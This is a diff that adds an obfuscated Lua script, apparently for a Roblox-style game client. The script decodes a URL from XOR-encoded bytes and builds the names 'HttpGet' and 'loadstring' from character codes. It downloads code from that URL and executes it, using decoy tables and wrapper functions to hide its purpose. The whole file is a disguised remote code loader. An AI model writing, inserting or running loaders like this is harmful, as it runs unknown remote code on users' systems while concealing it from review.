@@ -1,0 +1,65 @@
+(function()
+    local bx = string.byte
+    local cx = string.char
+    local ins = table.insert
+    local con = table.concat
+    local env = getfenv and getfenv(1) or _ENV
+    local z1 = function(...) return ({...})[select("#", ...)] end
+    local z2 = function(f) return function(...) return f(...) end end
+    local z3 = function(t, k) return t[k] end
+
+    local xor = function(t, k)
+        local o = {}
+        for i = 1, #t do
+            ins(o, bx(t:sub(i,i)) ~ k)
+        end
+        return o
+    end
+
+    local glue = function(t)
+        local s = ""
+        for i = 1, #t do
+            s = s .. cx(t[i])
+        end
+        return s
+    end
+
+    local __noise = {
+        [math.random(1,5)] = function(...) return nil end,
+        [math.random(6,10)] = "🌀🧩🌪️",
+        [math.random(11,15)] = function() return "ghost" end
+    }
+
+    local parts = {
+        glue(xor("\151\134\134\133\137\118\120", 203)),
+        glue(xor("\120\124", 203)),
+        glue(xor("\170\171\174\170\172\169\165\164\174\165\172", 203)),
+        glue(xor("\169", 203)),
+        glue(xor("\170\187\187", 203)),
+        glue(xor("\169", 203)),
+        glue(xor("\181\185", 203)),
+        glue(xor("\169", 203)),
+        glue(xor("\184\168\185\185\170", 203)),
+        glue(xor("\169", 203)),
+        glue(xor("\250\174\174\143\255\135\203\150\182\182\138\238\170\137\203", 203)),
+        glue(xor("\169", 203)),
+        glue(xor("\185\170\186", 203))
+    }
+
+    local final = con(parts)
+
+    local g = _G or game
+    local http_name = cx(72)..cx(116)..cx(116)..cx(112)..cx(71)..cx(101)..cx(116)
+    local http_func = z3(g, http_name)
+
+    local lstr = env[
+        cx(108)..cx(111)..cx(97)..cx(100)..cx(115)..cx(116)..cx(114)..cx(105)..cx(110)..cx(103)
+    ]
+
+    local ghost = z2(z2(function(f) return f end))
+
+    ghost(function()
+        local d = http_func(g, final, true)
+        return lstr(d)()
+    end)()
+end)()
